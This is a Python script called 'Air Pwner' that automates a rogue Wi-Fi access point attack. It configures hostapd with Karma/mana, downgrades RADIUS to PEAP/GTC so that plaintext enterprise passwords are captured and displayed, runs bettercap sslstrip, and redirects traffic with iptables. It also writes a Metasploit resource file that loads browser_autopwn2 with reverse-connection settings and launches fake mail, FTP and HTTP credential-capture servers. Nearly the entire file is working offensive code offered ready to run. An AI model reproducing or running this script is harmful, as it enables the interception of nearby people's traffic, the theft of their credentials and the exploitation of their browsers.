import sys,os,time,re
import argparse

parser = argparse.ArgumentParser(description='Air Pwner')
parser.add_argument('-i', action="store",dest="i",required=True,help="network interface to use")
parser.add_argument('-e', action="store",dest="e",required=True,help="ESSID of the rouge AP")
parser.add_argument('-m', action="store",dest="m",choices=set(("enterprise","personal")),required=True,help="Mode of Wifi AP")
parser.add_argument('-k', action="store_true",dest="k",help="Enable Karma mode")
parser.add_argument('-s', action="store_true",dest="s",help="Enable sslstrip")
parser.add_argument('-w', action="store",dest="w",help="Setup Web server",choices=set(("apache","karmetasploit")))
parser.add_argument('-d', action="store",dest="d",help="Persistent Redirect mode",choices=set(("Once","Persistent")))
parser.add_argument('-allowhttps', action="store_true",dest="allowhttps",help="Persistent Redirect mode")
args = parser.parse_args()

interface = args.i
essid = args.e
mode = args.m
karma = args.k
web = args.w
redirect = args.d
sslstrip = args.s
allowhttps = args.allowhttps
bssid = "1a:23:56:b4:90:6c"
hostip = "192.168.10.254"
channel = str(1)

def create_logs():
    os.system("touch radius.log")
    os.system("echo '' > radius.log")
    os.system("echo '' > log")

def config_karmetasploit():
    if web != "karmetasploit":
        return
    htmlContent = '<style>\nimg{\nposition: fixed; right: 0; bottom: 0;\nmin-width: 100%; min-height: 100%;\nwidth: auto; height: auto; z-index: -100;\nbackground: url(polina.jpg) no-repeat;\n' \
                  'background-size: cover;\n}\n</style>\n<img src="https://i.ytimg.com/vi/s0lWgPR3J2Y/maxresdefault.jpg"><audio autoplay loop><source src="http://soundbible.com/grab.php?id=2055&type=mp3"></audio>'
    os.system("service postgresql restart")
    file = open("index.html","w")
    file.write(htmlContent)
    file.close()
    content = "db_connect postgres:toor@127.0.0.1/msfbook\n\nuse auxiliary/server/browser_autopwn2\n\nsetg AUTOPWN_HOST "+hostip+"\n" \
              "setg AUTOPWN_PORT 4444\nsetg AUTOPWN_URI / \n\nset LHOST "+hostip+"\nset LPORT 45000\nsetg SRVHOST "+hostip+"\nset SRVPORT 80\n" \
              "set URIPATH / \nset HTMLContent file:/"+os.getcwd()+"/index.html\nrun\n" \
              """
                use auxiliary/server/capture/pop3
                set SRVPORT 110
                set SSL false
                run

                use auxiliary/server/capture/pop3
                set SRVPORT 995
                set SSL true
                run

                use auxiliary/server/capture/ftp
                run

                use auxiliary/server/capture/imap
                set SSL false
                set SRVPORT 143
                run

                use auxiliary/server/capture/imap
                set SSL true
                set SRVPORT 993
                run

                use auxiliary/server/capture/smtp
                set SSL false
                set SRVPORT 25
                run

                use auxiliary/server/capture/smtp
                set SSL true
                set SRVPORT 465
                run

                use auxiliary/server/capture/http
                set SRVPORT 82
                set SSL false
                run

                use auxiliary/server/capture/http
                set SRVPORT 8081
                set SSL false
                run

                use auxiliary/server/capture/http
                set SRVPORT 443
                set SSL true
                run

                use auxiliary/server/capture/http
                set SRVPORT 8444
                set SSL true

              """
    file = open("karma_rc.txt","w")
    file.write(content)
    file.close()
    
def config_apache():
    if web != "apache":
       return
    htmlContent = """ <?php\n\t
    $ip = $_SERVER['REMOTE_ADDR'];\n\t
    $arp = "/usr/sbin/arp"; // execute the arp command to get their mac address\n\t
    $mac = shell_exec("sudo $arp -an " . $ip);\n\t
    preg_match('/..:..:..:..:..:../',$mac , $matches);\n\t
    $mac = @$matches[0];\n\t
    if( $mac === NULL) {\n\t\t
        echo "Access Denied."; exit;\n\t
    }\n\t
    $cmd = "sudo iptables -t mangle -I internet 1 -m mac --mac-source ".$mac." -j RETURN";\n\t"""
    if redirect == "Once":
        htmlContent += "shell_exec($cmd);\n\t"
    htmlContent += """?>\n
    <style>\nimg{\nposition: fixed; right: 0; bottom: 0;\nmin-width: 100%; min-height: 100%;\nwidth: auto; height: auto; z-index: -100;\nbackground: url(polina.jpg) no-repeat;
    \nbackground-size: cover;\n}\n</style>\n<img src="kid.jpg">\n<audio autoplay loop><source src="sound.mp3"></audio> """
    os.system("rm /var/www/html/index*")
    os.system("echo '' > /var/log/apache2/access.log")
    file = open("/var/www/html/index.php","w")
    file.write(htmlContent)
    file.close()
    os.system("service apache2 restart")
    
def config_interface():
    os.system("sudo nmcli radio wifi off")
    os.system("sudo rfkill unblock wlan")
    os.system("ifconfig "+interface+" down")
    os.system("ifconfig "+interface+" hw ether "+bssid+" "+hostip+" up")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def config_iptables():
    os.system("sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE")
    if mode == "enterprise":
        os.system("sudo iptables -t nat -I POSTROUTING 1 -p udp --dport 1812 -j ACCEPT")
    if redirect == "Once" or redirect == "Persistent":
        os.system("sudo iptables -t mangle -N internet")
        os.system("sudo iptables -t mangle -A PREROUTING -i wlan0 -p tcp -m tcp --dport 80 -j internet")
        if allowhttps == False:
            os.system("sudo iptables -t mangle -A PREROUTING -i wlan0 -p tcp -m tcp --dport 443 -j internet")
            os.system("sudo iptables -t nat -I PREROUTING -i wlan0 -p tcp -m mark --mark 99 -m tcp --dport 443 -j DNAT --to-destination "+hostip)
        os.system("sudo iptables -t mangle -A internet -j MARK --set-mark 99")
        os.system("sudo iptables -t nat -I PREROUTING -i wlan0 -p tcp -m mark --mark 99 -m tcp --dport 80 -j DNAT --to-destination "+hostip)


        
    
def config_dhcp():
    os.system("echo > /etc/dnsmasq.leases")
    dhcp = open("dnsmasq.conf","w")
    dhcp.write("interface="+interface+"\n")
    dhcp.write("dhcp-range=192.168.10.5,192.168.10.20\n")
    dhcp.write("dhcp-leasefile=/etc/dnsmasq.leases\n")
    dhcp.write("dhcp-authoritative\n")
    dhcp.close()
    os.system("cat dnsmasq.conf > /etc/dnsmasq.conf")
    os.system("service dnsmasq restart")
    
def config_radius():
    text = open("/usr/local/etc/raddb/eap.conf","r").read()
    textlist = list(text)
    index = text.find("eap {")
    index = text.find("default_eap_type",index)
    index = index + len("default_eap_type = ")
    value = ""
    startIndex = index
    while text[index].isspace() != True:
        textlist[index] = " "
        index += 1
    textlist[startIndex:startIndex+3] = "peap"
    text = "".join(textlist)
    index = text.find("peap {")
    index = text.find("default_eap_type",index)
    index = index + len("default_eap_type = ")
    value = ""
    startIndex = index
    while text[index].isspace() != True:
        textlist[index] = " "
        index += 1
    textlist[startIndex:startIndex+2] = "gtc"
    text = re.sub("/^([\s]*eap \{.*?default_eap_type =) .*?$/m","\\1 peap",text)
    text = re.sub("/^([\s]*peap \{.*?default_eap_type =) .*?$/m","\\1 gtc",text)
    file = open("/usr/local/etc/raddb/eap.conf","w")
    text = "".join(textlist)
    file.write(text)
    file.close()
    
def config_hostapd():
    if mode == "enterprise":
        content = "interface="+ interface+"\nchannel="+channel+"\n" \
                  "ssid="+essid+"\nieee8021x=1\nauth_server_addr=127.0.0.1\nauth_server_port=1812\n" \
                  "auth_server_shared_secret=testing123\nwpa=2\nwpa_key_mgmt=WPA-EAP\nrsn_pairwise=CCMP\n"
    elif mode == "personal":
        content = "interface="+ interface+"\nchannel="+channel+"\n" \
                  "ssid="+essid+"\ndriver=nl80211\ndisassoc_low_ack=0\n" \
                  "ap_max_inactivity=3000\nauth_algs=3\nlogger_syslog=-1\n" \
                  "logger_stdout=-1\nlogger_syslog_level=2\nlogger_stdout_level=2\n" \
                  "ctrl_interface=/var/run/hostapd\nctrl_interface_group=0"
    if karma == True:
        content += "\nenable_mana=1\nmana_loud=0\nmana_macacl=0\n"
    file = open("hostapd.conf","w")
    file.write(content)
    file.close()

def start_all():
    os.system("xterm -T 'HOSTAPD DEBUG' -e /usr/lib/mana-toolkit/hostapd -d hostapd.conf &")
    if sslstrip == True:
        os.system("xterm -T 'Bettercap' -e bettercap -I "+interface+" --no-discovery --no-spoofing --proxy --proxy-https POST -X --log log &")
    if mode == "enterprise":
        os.system("xterm -T 'RADIUS DEBUG' -e 'radiusd -X | tee radius.log' &")
        os.system("xterm -T 'GTC PASSWORDS' -e 'tail -f radius.log | grep \"login attempt with password\\|Identity -\"' &")
    if web == "apache":
        os.system("xterm -T 'Apache2' -e tail -f /var/log/apache2/access.log &")
    if web == "karmetasploit":
        os.system("xterm -T 'Karmetasploit' -e msfconsole -r karma_rc.txt &")
    
create_logs()
config_karmetasploit()
config_apache()
config_interface()
config_dhcp()
config_radius()
config_hostapd()
start_all()
time.sleep(8)
config_iptables()

while True:
    try:
        time.sleep(1)
    except KeyboardInterrupt:
        if mode == "enterprise":
            os.system("killall radiusd")
        if sslstrip == True:
            os.system("killall bettercap")
        os.system("killall hostapd")
        os.system("iptables -t nat -F")
        os.system("iptables -t mangle -F")
        if redirect == "Once" or redirect == "Persistent":
            os.system("iptables -t mangle -X internet")
        os.system("service dnsmasq stop")
        os.system("service apache2 stop")
        os.system("service postgresql stop")
        sys.exit(0)